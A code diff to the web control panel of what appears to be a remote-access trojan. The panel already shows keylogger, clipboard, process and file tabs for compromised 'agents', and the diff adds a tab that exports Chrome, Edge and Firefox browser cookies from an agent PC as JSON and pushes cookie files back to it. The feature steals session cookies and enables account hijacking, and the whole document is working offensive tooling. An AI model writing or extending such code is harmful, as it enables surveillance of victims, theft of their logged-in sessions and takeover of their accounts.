@@ -309,6 +309,7 @@
       <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
       <div class="tab" onclick="switchTab('processes')">Processes</div>
       <div class="tab" onclick="switchTab('files')">Files</div>
+      <div class="tab" onclick="switchTab('cookies')">🍪</div>
     </div>
 
     <div id="tab-keylog" class="tab-panel active">
@@ -355,6 +356,22 @@
         <label id="fm-upload-btn" title="Upload file">⬆ Upload<input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmUpload(this)"></label>
       </div>
       <div id="fm-list"><div id="fm-status">Select an agent and open Files tab</div></div>
+    </div>
+
+    <div id="tab-cookies" class="tab-panel">
+      <div class="panel-header">Browser Cookies</div>
+      <div style="padding:12px;display:flex;flex-direction:column;gap:10px;">
+        <div style="font-size:10px;color:#555;line-height:1.6;">Export cookies from the agent PC (Chrome, Edge, Firefox) or push cookies to it. Close browsers on the agent PC first.</div>
+        <button class="hdr-btn" id="ck-export-btn" onclick="cookieExport()" style="padding:7px 0;font-size:11px;">⬇ Export Cookies from Agent</button>
+        <div id="ck-export-status" style="font-size:10px;color:#555;min-height:14px;"></div>
+        <hr style="border:none;border-top:1px solid #222;">
+        <div style="font-size:10px;color:#555;">Push cookies TO agent (import a cookies_export.json):</div>
+        <label style="padding:7px 0;font-size:11px;background:#2a2a2a;border:1px solid #333;color:#aaa;border-radius:4px;text-align:center;cursor:pointer;">
+          ⬆ Import Cookies to Agent
+          <input type="file" id="ck-import-file" accept=".json" style="display:none" onchange="cookieImport(this)">
+        </label>
+        <div id="ck-import-status" style="font-size:10px;color:#555;min-height:14px;"></div>
+      </div>
     </div>
 
     <div id="control-panel">
@@ -524,7 +541,7 @@ function target() { return selectedAgent; }
 
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(name) {
-  const names = ["keylog", "clipboard", "processes", "files"];
+  const names = ["keylog", "clipboard", "processes", "files", "cookies"];
   document.querySelectorAll(".tab").forEach((t, i) => {
     t.className = "tab" + (names[i] === name ? " active" : "");
   });
@@ -859,6 +876,52 @@ socket.on("win_frame", d => {
   if (!winStreaming) return;
   if (d._agent && d._agent !== selectedAgent) return;
   frameImg.src = "data:image/jpeg;base64," + d.data;
+});
+
+// ── Cookie manager ────────────────────────────────────────────────────────────
+function cookieExport() {
+  if (!selectedAgent) { alert("Select an agent first."); return; }
+  document.getElementById("ck-export-status").textContent = "Exporting… (close browsers on agent PC first)";
+  document.getElementById("ck-export-btn").disabled = true;
+  socket.emit("export_cookies", { _target: selectedAgent });
+}
+
+socket.on("cookies_data", d => {
+  const st = document.getElementById("ck-export-status");
+  const btn = document.getElementById("ck-export-btn");
+  btn.disabled = false;
+  if (d.error) { st.style.color = "#f87171"; st.textContent = "Error: " + d.error; return; }
+  st.style.color = "#4ade80";
+  st.textContent = `Got ${d.count} cookies — downloading JSON…`;
+  const blob = new Blob([JSON.stringify(d.cookies, null, 2)], { type: "application/json" });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href = url; a.download = "cookies_export.json";
+  document.body.appendChild(a); a.click();
+  document.body.removeChild(a); URL.revokeObjectURL(url);
+});
+
+function cookieImport(input) {
+  const file = input.files[0];
+  if (!file || !selectedAgent) { alert("Select an agent and a JSON file."); return; }
+  const st = document.getElementById("ck-import-status");
+  st.style.color = "#aaa"; st.textContent = "Reading file…";
+  const reader = new FileReader();
+  reader.onload = e => {
+    try {
+      const cookies = JSON.parse(e.target.result);
+      st.textContent = `Sending ${cookies.length} cookies to agent (close browsers first)…`;
+      socket.emit("import_cookies", { cookies, _target: selectedAgent });
+    } catch { st.style.color = "#f87171"; st.textContent = "Invalid JSON file."; }
+  };
+  reader.readAsText(file);
+  input.value = "";
+}
+
+socket.on("import_result", d => {
+  const st = document.getElementById("ck-import-status");
+  st.style.color = d.ok ? "#4ade80" : "#f87171";
+  st.textContent = d.ok ? "Import done! " + (d.message || "") : "Error: " + d.message;
 });
 
 // PostMessage mouse: when target window selected, clicks on canvas go to target
